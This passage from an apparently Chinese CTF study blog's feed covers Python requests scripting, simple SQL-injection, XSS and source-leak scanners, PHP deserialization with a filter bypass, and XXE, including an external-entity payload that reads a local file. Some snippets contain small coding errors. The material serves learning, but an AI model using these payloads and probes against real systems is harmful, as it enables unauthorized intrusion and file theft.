class="line">&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">req=requests.get(url,proxies=proxies,params=params)</span><br></pre></td></tr></table></figure><p><strong>带参数的 HTTP POST请求</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">data = &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;Login&quot;:&quot;Login&quot;&#125;</span><br><span class="line">url=&quot;.../login.php&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">req=requests.post(url,proxies=proxies,data=data)</span><br></pre></td></tr></table></figure><p>对比python post提交和页面post请求的内容区别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python提交少了cookie信息</span><br></pre></td></tr></table></figure><p><strong>Cookie作用与使用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">保存用户状态信息</span><br></pre></td></tr></table></figure><p>利用http请求头中的cookie头携带</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">data = &#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;Login&quot;:&quot;Login&quot;&#125;</span><br><span class="line">url=&quot;.../login.php&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">headers=&#123;&quot;Cookie&quot;:&quot;xxx&quot;&#125;</span><br><span class="line">req=requests.post(url,proxies=proxies,data=data,headers=headers)</span><br></pre></td></tr></table></figure><p><strong>为了更方便在python中使用cookie，requests模块中提供了保持会话的方法session()</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;.../login.php&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">s=request.session()</span><br><span class="line">req1=s.get(url,proxies=proxies)#保存cookie</span><br><span class="line">print(req1.headers)</span><br><span class="line">data=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;Login&quot;:&quot;Login&quot;&#125;</span><br><span class="line">req2=s.post(url,proxies=proxies,data=data)</span><br></pre></td></tr></table></figure><p><strong>默认requests超时比较长，此时可缩短超时限制</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;.../login.php&quot;</span><br><span class="line">proxies=&#123;</span><br><span class="line">&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">&quot;https&quot;:&quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line">s=request.session()</span><br><span class="line">req1=s.get(url,proxies=proxies)#保存cookie</span><br><span class="line">print(req1.headers)</span><br><span class="line">data=&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;Login&quot;:&quot;Login&quot;&#125;</span><br><span class="line">req2=s.post(url,proxies=proxies,data=data,timeout=3)</span><br></pre></td></tr></table></figure><h4 id="Python-SQL注入自动化检测"><a href="#Python-SQL注入自动化检测" class="headerlink" title="Python SQL注入自动化检测"></a>Python SQL注入自动化检测</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发送可能构造错误的SQL语句，若发生错误，存在SQL注入漏洞。</span><br></pre></td></tr></table></figure><p><strong>关键词 SQL syntax</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;&quot;</span><br><span class="line">params=&#123;&quot;id&quot;:&quot;&#x27;&quot;&#125;</span><br><span class="line">req=requests.get(url,params=params)</span><br><span class="line">if req.text.find(&quot;SQL syntax&quot;) !=-1:</span><br><span class="line">print(&quot;find sql inject&quot;)</span><br><span class="line">else:</span><br><span class="line">print(&#x27;no&#x27;)</span><br></pre></td></tr></table></figure><h4 id="Python-XSS自动化检查"><a href="#Python-XSS自动化检查" class="headerlink" title="Python XSS自动化检查"></a>Python XSS自动化检查</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">检测思路：</span><br><span class="line">发送XSS Payload，筛选是否具有payload，那么存在XSS。</span><br></pre></td></tr></table></figure><p>Python XSS检测代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;&quot;</span><br><span class="line">payload=&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span><br><span class="line"></span><br><span class="line">params=&#123;&quot;a&quot;:payload&#125;</span><br><span class="line">req=requests.get(url,params=params)</span><br><span class="line">if req.text.find(payload)!=-1:</span><br><span class="line">print(&quot;xss found&quot;)</span><br><span class="line">else:</span><br><span class="line">print(&quot;no xss&quot;)</span><br></pre></td></tr></table></figure><p><a href="https://github.com/payloadbox/xss-payload-list">https://github.com/payloadbox/xss-payload-list</a></p><p>下载XSS Payload List，新建文件，替换payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xss_payload.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">payload_list=f.readlines()</span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payload_list:</span><br><span class="line">payload.strip()<span class="comment">#去除空格</span></span><br><span class="line">params=&#123;<span class="string">&quot;a&quot;</span>:payload&#125;</span><br><span class="line">req=requests.get(url,params=params)</span><br><span class="line"><span class="keyword">if</span> req.text.find(payload)!=-<span class="number">1</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;xss found&quot;</span>)</span><br><span class="line">sys.exit()<span class="comment">#找到退出</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;no xss&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Python源码泄漏自动化挖掘"><a href="#Python源码泄漏自动化挖掘" class="headerlink" title="Python源码泄漏自动化挖掘"></a>Python源码泄漏自动化挖掘</h4><p>常见源码泄漏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.git、.svn、.DS_Store以及backup.zip等目录或文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payloads=[&#x27;.git&#x27;,&#x27;.svn&#x27;,&#x27;.DS_Store&#x27;,&#x27;backup.zip&#x27;]</span><br><span class="line">url=&quot;&quot;</span><br><span class="line">for payload in payloads:</span><br><span class="line">req=requests.get(url+ &quot;/&quot;+payload)</span><br><span class="line">if req.status_code==200 : </span><br><span class="line">print(&quot;yes:&quot;+req.request.url )</span><br><span class="line">break</span><br><span class="line">else:</span><br><span class="line">continue</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>添加txt字典遍历</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payloads=[&#x27;.git&#x27;,&#x27;.svn&#x27;,&#x27;.DS_Store&#x27;,&#x27;backup.zip&#x27;]</span><br><span class="line">with open(&quot;urls.txt&quot;,&quot;r&quot;) as f :</span><br><span class="line">url_list=f.readlines()</span><br><span class="line">for url in url_list:</span><br><span class="line">        for payload in payloads:</span><br><span class="line">            req=requests.get(url+ &quot;/&quot;+payload)</span><br><span class="line">            if req.status_code==&#x27;200&#x27;:</span><br><span class="line">                print(&quot;yes&quot;)</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                continue</span><br><span class="line"> </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;python脚本基础&quot;&gt;&lt;a href=&quot;#python脚本基础&quot; class=&quot;headerlink&quot; title=&quot;python脚本基础&quot;&gt;&lt;/a&gt;python脚本基础&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;requests库使用&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-PHP序列化安全</title>
    <link href="http://example.com/2021/05/30/CTF-PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%89%E5%85%A8/"/>
    <id>http://example.com/2021/05/30/CTF-PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%89%E5%85%A8/</id>
    <published>2021-05-30T13:16:24.000Z</published>
    <updated>2021-07-27T01:40:59.356Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PHP序列化安全"><a href="#PHP序列化安全" class="headerlink" title="PHP序列化安全"></a>PHP序列化安全</h3><p>序列化和反序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">序列化 将复杂的数据结构转换为适合传输和保存的字节类型。(存储)</span><br><span class="line">反序列化 将字节类型转换为复杂的数据结构(程序使用)</span><br></pre></td></tr></table></figure><span id="more"></span><ul><li>序列化和反序列化并非php独有，php，ruby，java都具有该技术。</li></ul><h4 id="PHP序列化操作"><a href="#PHP序列化操作" class="headerlink" title="PHP序列化操作"></a>PHP序列化操作</h4><p><a href="https://www.php.net/manual/zh/function.serialize.php">https://www.php.net/manual/zh/function.serialize.php</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Site&#123;</span><br><span class="line">public $name=&#x27;ctf&#x27;;</span><br><span class="line">public function get_name()</span><br><span class="line">&#123;</span><br><span class="line">echo $name;</span><br><span class="line">echo md5(&#x27;admin&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new site();</span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c=unserialize($b);</span><br><span class="line">$c-&gt;get_name();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过反序列化操作将序列化对象 转换为 对象类型，调用其中的get_name方法。如果用户可自定义提交序列化字符串，那么此时反序列化后，就可以控制程序执行的代码，造成安全威胁。</p><p>一般不会直接调用方法，而是通过一些魔术方法调用其中的函数。</p><h4 id="PHP反序列化CTF案例"><a href="#PHP反序列化CTF案例" class="headerlink" title="PHP反序列化CTF案例"></a>PHP反序列化CTF案例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize()会检查是否存在一个_wakeup()方法，如果存在，则先调用_wakeup方法，预先准备对象需要的资源。</span><br></pre></td></tr></table></figure><p>实验代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">class Site&#123;</span><br><span class="line">public $name=&#x27;ctf&#x27;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">echo &#x27;flag&#123;xxx&#125;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj =unserialize($data);</span><br></pre></td></tr></table></figure><p>1、序列化字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Site&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;ctf&quot;;&#125;</span><br></pre></td></tr></table></figure><p>2、发送字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过burp</span><br><span class="line">post提交字符串</span><br></pre></td></tr></table></figure><h4 id="PHP反序列化识别与利用"><a href="#PHP反序列化识别与利用" class="headerlink" title="PHP反序列化识别与利用"></a>PHP反序列化识别与利用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反序列化识别根本 在于发现HTTP请求是否存在序列化字符串</span><br></pre></td></tr></table></figure><p>反序列化识别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">burp 可自动识别HTTP请求中的序列化字符串</span><br></pre></td></tr></table></figure><p>1、burp代理截断，截获http请求数据包。</p><p>2、burp target扫描请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在HTTP中，右键鼠标，进行扫描。</span><br><span class="line">可发现漏洞。</span><br></pre></td></tr></table></figure><p>如果要求post提交，需要将get改成post，右键选中change request method。</p><h4 id="PHP序列化特殊点介绍"><a href="#PHP序列化特殊点介绍" class="headerlink" title="PHP序列化特殊点介绍"></a>PHP序列化特殊点介绍</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在定义类时，对应的属性可设置访问限制。通过public、protected、private进行设置权限。对于序列化对象中的数字是否可以有符号问题。 </span><br></pre></td></tr></table></figure><p>对象中的属性修饰符</p><p>定义user类，并且设置属性具有protected和private属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">protected $name=&#x27;admin&#x27;;</span><br><span class="line">private $admin=&#x27;true&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$user=new user();</span><br><span class="line">echo serialize($user);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>直接查看浏览器无法识别符号，可使用python输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、protected 修饰的属性在序列化之后，修改为 \x00*\x00属性名</span><br><span class="line">2、private 修饰的属性在序列化之后，修改为 \x00类名\x00属性名</span><br></pre></td></tr></table></figure><h4 id="序列化字符串中的-号"><a href="#序列化字符串中的-号" class="headerlink" title="序列化字符串中的+号"></a>序列化字符串中的+号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在序列化字符串中的数字前可使用+号表示正数，不影响反序列化的结果。</span><br></pre></td></tr></table></figure><p>可绕过数字过滤，在需要进行URL编码%2b</p><h4 id="PHP序列化-魔术方法"><a href="#PHP序列化-魔术方法" class="headerlink" title="PHP序列化 - 魔术方法"></a>PHP序列化 - 魔术方法</h4><h4 id=""><a href="#" class="headerlink" title=""></a></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">魔术方法 是定义类过程中 以双下划线开头、PHP语言定义好的方法。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__construct():类的析造函数</span><br><span class="line">__destruct():类的析构函数</span><br><span class="line">__wakeup():执行unserialize()时，先会调用这个函数</span><br><span class="line">__tostring():类被当作字符串回应的方法。</span><br></pre></td></tr></table></figure><ul><li>flag被注释的时候，执行命令查看flag时，可用type flag。</li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;PHP序列化安全&quot;&gt;&lt;a href=&quot;#PHP序列化安全&quot; class=&quot;headerlink&quot; title=&quot;PHP序列化安全&quot;&gt;&lt;/a&gt;PHP序列化安全&lt;/h3&gt;&lt;p&gt;序列化和反序列化&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;序列化 将复杂的数据结构转换为适合传输和保存的字节类型。(存储)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;反序列化 将字节类型转换为复杂的数据结构(程序使用)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF-XXE注入</title>
    <link href="http://example.com/2021/05/29/CTF-XXE%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2021/05/29/CTF-XXE%E6%B3%A8%E5%85%A5/</id>
    <published>2021-05-29T13:14:45.000Z</published>
    <updated>2021-07-27T01:41:35.245Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xml外部实体注入漏洞。XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意的外部文件，造成文件读取、命令执行等等。XXE漏洞触发点在可上传xml文件的位置，没有对上传的xml文件过滤，导致上传恶意的xml文件。</span><br></pre></td></tr></table></figure><span id="more"></span><h4 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a><strong>XML基础</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">XML，用来传输和存储数据。没有预定义标签，用户自定义标签。</span><br><span class="line">HTML较固定。</span><br></pre></td></tr></table></figure><p><strong>XML语法规则</strong></p><p><a href="https://www.w3school.com.cn/xml/xml_syntax.asp">https://www.w3school.com.cn/xml/xml_syntax.asp</a></p><ul><li>1、所有XML元素都必须有关闭标签</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;xxxxx&lt;/p&gt;</span><br></pre></td></tr></table></figure><ul><li>2、XML标签对大小写敏感</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;hhh&lt;/message&gt;正确</span><br><span class="line"></span><br><span class="line">&lt;Message&gt;hhh&lt;/message&gt;错误</span><br></pre></td></tr></table></figure><ul><li>3、XML必须正确地嵌套</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;b&gt;&lt;i&gt;hhh&lt;/b&gt;&lt;/i&gt;错误</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;b&gt;&lt;i&gt;hhh&lt;/i&gt;&lt;/b&gt;正确</span><br></pre></td></tr></table></figure><ul><li>4、XML文档必须有根元素</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;root&gt;</span><br><span class="line">&lt;child&gt;</span><br><span class="line">&lt;subchild&gt;...&lt;/subchild&gt;</span><br><span class="line">&lt;/child&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><ul><li>5、XML的属性值必须加引号</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;note data=&quot;05/28/2021&quot;&gt;</span><br><span class="line">&lt;from&gt;you&lt;/from&gt;</span><br><span class="line">&lt;to&gt;Me&lt;/to&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><strong>1、实体引用</strong></p><p>由于&lt;可能会被误认为标签符</p><table><thead><tr><th>&amp;lt;</th><th>&lt;</th><th>小于</th></tr></thead><tbody><tr><td>&amp;gt;</td><td>&gt;</td><td>大于</td></tr><tr><td>&amp;amp;</td><td>&amp;</td><td>和号</td></tr><tr><td>&amp;apos;</td><td>‘</td><td>单引号</td></tr><tr><td>&amp;quot;</td><td>“</td><td>引号</td></tr></tbody></table><p><strong>2、XML中的注释</strong></p><p>类似HTML</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--this is a comment --&gt;</span><br></pre></td></tr></table></figure><p><strong>3、在XML中，空格会被保留</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTML会把多个连续的空格字符裁剪(合并)为一个，但是XML不会合并空格。</span><br></pre></td></tr></table></figure><h4 id="XML文档组成"><a href="#XML文档组成" class="headerlink" title="XML文档组成"></a>XML文档组成</h4><p><strong>XML文档形成了一种树结构，它从”根部”开始，然后扩展到”枝叶”。</strong></p><p><strong>DTD文档类型定义</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DTD是定义XML文档合法构建的模块。既可以在XML文档定义，也可以在外部引用。</span><br></pre></td></tr></table></figure><p><strong>内部的文档声明</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素[元素声明]&gt;</span><br></pre></td></tr></table></figure><p><strong>外部的文档声明</strong></p><p>假如DTD位于XML源文件的外部，那么它应通过下面的语法被封装在一个DOCTYPE定义中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="DTD-实体"><a href="#DTD-实体" class="headerlink" title="DTD-实体"></a>DTD-实体</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</span><br><span class="line">实体引用是对实体的引用</span><br><span class="line">实体可在内部或外部进行声明</span><br></pre></td></tr></table></figure><p><strong>内部声明</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;wang&quot;&gt;</span><br><span class="line">&lt;!ENTITY book &quot;hhh&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;author&gt;&amp;writer;&amp;book;&lt;/author&gt;</span><br></pre></td></tr></table></figure><ul><li>一个实体由三部分构成：一个和号(&amp;)，一个实体名称，以及一个分号(;)。</li></ul><p><strong>外部声明</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">需要基于php解析</span><br></pre></td></tr></table></figure><p><strong>外部注入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ELEMENT note (message)&gt;</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;file:///C:/flag.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;message&gt;&amp;test;&lt;/message&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>浏览器中不会解析读取数据，但是可基于php解析。</p><h3 id="XML盲注利用姿势"><a href="#XML盲注利用姿势" class="headerlink" title="XML盲注利用姿势"></a>XML盲注利用姿势</h3><p>实体参数基础</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实体参数只能用于DID中，实体参数的声明和引用都是以%开头。</span><br></pre></td></tr></table></figure><p>实体参数：相当于实体的引用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">&lt;!ELEMENT a (b)&gt;</span><br><span class="line">&lt;!ENTITY % c &quot;&lt;!ENTITY d &#x27;abcd&#x27;&gt;&quot;&gt; 定义(必须有空格)</span><br><span class="line">%c;   引用(无需空格，需要分号)</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;</span><br><span 